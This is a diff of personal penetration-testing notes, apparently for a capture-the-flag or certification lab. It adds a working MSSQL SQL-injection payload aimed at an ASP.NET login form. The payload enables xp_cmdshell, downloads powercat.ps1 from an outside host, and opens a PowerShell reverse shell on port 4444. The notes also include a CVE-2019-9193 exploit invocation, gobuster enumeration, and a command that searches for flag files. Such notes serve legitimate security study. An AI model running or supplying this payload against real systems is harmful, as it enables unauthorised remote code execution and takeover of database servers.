@@ -718,10 +718,18 @@ python3 cve-2019-9193.py -i 192.168.198.49 -d glovedb -U rubben -P password -c b
 
 For windows IIS servers, we need to use gobuster with aspx extension and word list.  also disable errors
 
-reverse shell sqli for MSQL
+need to enable cmd_shell
+`';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+
+
 ;EXEC master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.202/powercat.ps1\");powercat -c 192.168.45.202 -p 4444 -e powershell"';--+//&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test&ctl00%24ContentPlaceHolder1%24LoginButton=Login
 
-Get-ChildItem *flag* -File -Recurse -ErrorAction SilentlyContinue
+** Make sure to go back to root directory before running
+Powershell command to recursively search for file
+
+```
+Get-ChildItem flag.txt -File -Recurse -ErrorAction SilentlyContinue
+```
 
 ```
 gobuster dir -u http://192.168.198.50 -x aspx -w aspx.txt --no-error
